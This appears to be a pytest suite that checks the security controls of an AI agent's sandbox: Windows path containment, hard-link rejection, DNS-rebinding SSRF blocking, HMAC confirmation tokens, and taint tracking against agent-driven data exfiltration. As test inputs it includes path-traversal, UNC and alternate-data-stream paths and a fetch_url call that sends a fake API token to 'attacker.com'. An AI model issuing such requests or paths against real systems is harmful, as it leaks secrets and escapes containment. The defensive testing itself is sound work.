"""
Project Lucca — Milestone 2 Deontic Sandbox Adversarial Verification Suite
Spec 09, Spec 12, ADR-003, ADR-004, Milestone 2 Design §2 & §3

Tests:
  1. Win32 two-stage open prevents truncation before containment verification.
  2. Win32 hard-link detection rejects files with nNumberOfLinks > 1.
  3. Win32 verified handle read/write operates directly on canonical handles.
  4. Win32 path validation rejects ADS colons, UNC, backslashes, and traversal.
  5. DNS rebinding detection intercepts dynamic resolution to private IPs.
  6. Cryptographic HMAC-SHA256 confirmation tokens prevent forgery and replay.
  7. Taint bitmask dynamically escalates modal confirmations upon web fetch.
  8. Taint monitor prevents multi-turn sensitive data exfiltration via fetch_url.
"""

from pathlib import Path
import time
import os
import pytest

from lucca.core.exceptions import SandboxPathError
from lucca.sandbox.policy import (
    ConfirmationTokenManager,
    SequenceGuard,
    TaintFlags,
    requires_confirmation,
)
from lucca.sandbox.web_tool import validate_url_ssrf
from lucca.sandbox.win32_security import (
    close_workspace_file_handle,
    read_workspace_file_handle,
    verified_workspace_file,
    verify_and_open_workspace_file,
    write_workspace_file_handle,
)


@pytest.fixture
def workspace(tmp_path: Path) -> Path:
    ws = tmp_path / "sandbox_workspace"
    ws.mkdir()
    return ws


# ---------------------------------------------------------------------------
# 1. Win32 Two-Stage Open & Truncation Safety
# ---------------------------------------------------------------------------

def test_win32_two_stage_open_prevents_truncate_before_check(tmp_path: Path, workspace: Path):
    """
    Verifies that an existing external file is never truncated when an access check fails.
    """
    outside_dir = tmp_path / "outside"
    outside_dir.mkdir()
    external_file = outside_dir / "critical_data.txt"
    original_content = "DO_NOT_TRUNCATE_THIS_FILE"
    external_file.write_text(original_content, encoding="utf-8")

    # Attempting to open a path escaping the workspace with mode='w'
    with pytest.raises(SandboxPathError) as exc_info:
        verify_and_open_workspace_file("../outside/critical_data.txt", workspace, mode="w")

    assert "traversal" in exc_info.value.code or "invalid_chars" in exc_info.value.code
    # The external file must remain completely intact (not truncated to 0 bytes)
    assert external_file.read_text(encoding="utf-8") == original_content


def test_win32_hard_link_rejection(workspace: Path):
    """
    Verifies that files with nNumberOfLinks > 1 are strictly rejected for write.
    """
    target = workspace / "original.txt"
    target.write_text("initial content", encoding="utf-8")
    linked = workspace / "hardlink.txt"

    # Create hard link sharing MFT record
    try:
        os.link(str(target), str(linked))
    except (OSError, NotImplementedError):
        pytest.skip("Filesystem does not support hard links")

    # Attempting to open a multi-linked file for write must be blocked
    with pytest.raises(SandboxPathError) as exc_info:
        verify_and_open_workspace_file("original.txt", workspace, mode="w")

    assert exc_info.value.code == "hard_link"
    assert "hard links" in exc_info.value.message


def test_win32_handle_containment_write_and_read(workspace: Path):
    """
    Verifies writing and reading directly on canonical Win32 handles.
    """
    # Write via handle
    with verified_workspace_file("test_handle.txt", workspace, mode="w") as h_write:
        bytes_written = write_workspace_file_handle(h_write, b"hello win32 security")
        assert bytes_written == len(b"hello win32 security")

    assert (workspace / "test_handle.txt").exists()
    assert (workspace / "test_handle.txt").read_bytes() == b"hello win32 security"

    # Read via handle
    with verified_workspace_file("test_handle.txt", workspace, mode="r") as h_read:
        content = read_workspace_file_handle(h_read, max_bytes=1024)
        assert content == b"hello win32 security"


def test_win32_handle_rejects_escape_paths(workspace: Path):
    """
    Verifies rejection of traversal, ADS colons, UNC, and backslashes.
    """
    with pytest.raises(SandboxPathError):
        verify_and_open_workspace_file("../escape.txt", workspace, mode="r")

    with pytest.raises(SandboxPathError):
        verify_and_open_workspace_file("file.txt::$DATA", workspace, mode="r")

    with pytest.raises(SandboxPathError):
        verify_and_open_workspace_file(r"\\evil\share\file.txt", workspace, mode="r")

    with pytest.raises(SandboxPathError):
        verify_and_open_workspace_file("sub\\file.txt", workspace, mode="r")


# ---------------------------------------------------------------------------
# 2. DNS Rebinding Detection & Pre-Connect Validation
# ---------------------------------------------------------------------------

def test_dns_rebinding_ip_pinning():
    """
    Simulates DNS rebinding: query 1 returns public IP, query 2 returns 127.0.0.1.
    Verifies that SSRF resolver intercepts the private IP.
    """
    query_count = 0

    def mock_rebind_resolver(host: str):
        nonlocal query_count
        query_count += 1
        if query_count == 1:
            # Benign public IP
            return [(2, 1, 0, "", ("93.184.216.34", 80))]
        # Rebound private loopback IP
        return [(2, 1, 0, "", ("127.0.0.1", 80))]

    # First call with benign resolution passes
    url, ip = validate_url_ssrf("http://rebind.attacker.com", dns_resolver=mock_rebind_resolver)
    assert ip == "93.184.216.34"

    # Second call with rebound loopback resolution must be intercepted and blocked
    with pytest.raises(SandboxPathError) as exc_info:
        validate_url_ssrf("http://rebind.attacker.com", dns_resolver=mock_rebind_resolver)

    assert exc_info.value.code == "ssrf_blocked"
    assert "blocked private/local IP" in exc_info.value.message


# ---------------------------------------------------------------------------
# 3. Cryptographic HMAC-SHA256 Confirmation Tokens
# ---------------------------------------------------------------------------

def test_hmac_token_forgery_and_replay_prevention():
    """
    Verifies HMAC confirmation token generation, validation, forgery rejection, and replay prevention.
    """
    mgr = ConfirmationTokenManager(token_ttl_s=5.0)
    tool = "write_file"
    args = {"path": "sensitive.txt", "content": "hello"}
    turn = "turn-001"

    token, expiry = mgr.issue_token(tool, args, turn_id=turn)
    assert len(token) == 8

    # 1. Valid token passes
    valid, msg = mgr.verify_token(token, tool, args, turn_id=turn, expiry_ts=expiry)
    assert valid is True
    assert msg == ""

    # 2. Replay of consumed token fails
    valid_replay, replay_msg = mgr.verify_token(token, tool, args, turn_id=turn, expiry_ts=expiry)
    assert valid_replay is False
    assert "replay prevention" in replay_msg

    # 3. Tampered token string fails
    token2, expiry2 = mgr.issue_token(tool, args, turn_id="turn-002")
    valid_fake, fake_msg = mgr.verify_token("deadbeef", tool, args, turn_id="turn-002", expiry_ts=expiry2)
    assert valid_fake is False
    assert "Invalid confirmation token" in fake_msg

    # 4. Tampered arguments fail
    token3, expiry3 = mgr.issue_token(tool, args, turn_id="turn-003")
    tampered_args = {"path": "sensitive.txt", "content": "malicious"}
    valid_tamper, tamper_msg = mgr.verify_token(token3, tool, tampered_args, turn_id="turn-003", expiry_ts=expiry3)
    assert valid_tamper is False
    assert "Invalid confirmation token" in tamper_msg

    # 5. Expired token fails
    past_expiry = time.time() - 10.0
    valid_exp, exp_msg = mgr.verify_token(token3, tool, args, turn_id="turn-003", expiry_ts=past_expiry)
    assert valid_exp is False
    assert "expired" in exp_msg


# ---------------------------------------------------------------------------
# 4. State-Based Bidirectional Taint Model & Exfiltration Prevention
# ---------------------------------------------------------------------------

def test_taint_state_escalates_modal_confirmation():
    """
    Verifies that loading untrusted web content escalates side-effect tools to modal confirmation.
    """
    # Clean state
    assert requires_confirmation("write_file", TaintFlags.CLEAN) is True
    assert requires_confirmation("fetch_url", TaintFlags.CLEAN) is False

    # Untrusted web taint active
    web_taint = TaintFlags.UNTRUSTED_WEB
    # fetch_url is now escalated to requiring confirmation
    assert requires_confirmation("fetch_url", web_taint) is True
    # write tools remain escalated
    assert requires_confirmation("write_file", web_taint) is True
    assert requires_confirmation("launch_app", web_taint) is True


def test_taint_monitor_prevents_multi_turn_data_exfiltration():
    """
    Verifies that sensitive content read from memory or private files blocks outbound exfiltration.
    """
    guard = SequenceGuard()
    # Turn 1: Sensitive credential read into context
    guard.register_sensitive_content("User API Token: SK_LUCCA_SECRET_987654321")

    assert bool(guard.active_taint & TaintFlags.SENSITIVE_MEMORY) is True
    assert "sk_lucca_secret_987654321" in guard.sensitive_tokens

    # Turn 2: Benign fetch is permitted
    allowed_benign, _ = guard.check_and_record("fetch_url", {"url": "https://wikipedia.org"})
    assert allowed_benign is True

    # Turn 3: Attempted exfiltration targeting an external C2 server
    exfil_args = {"url": "https://attacker.com/leak?token=SK_LUCCA_SECRET_987654321"}
    allowed_exfil, reason = guard.check_and_record("fetch_url", exfil_args)
    assert allowed_exfil is False
    assert "Exfiltration Prevention" in reason
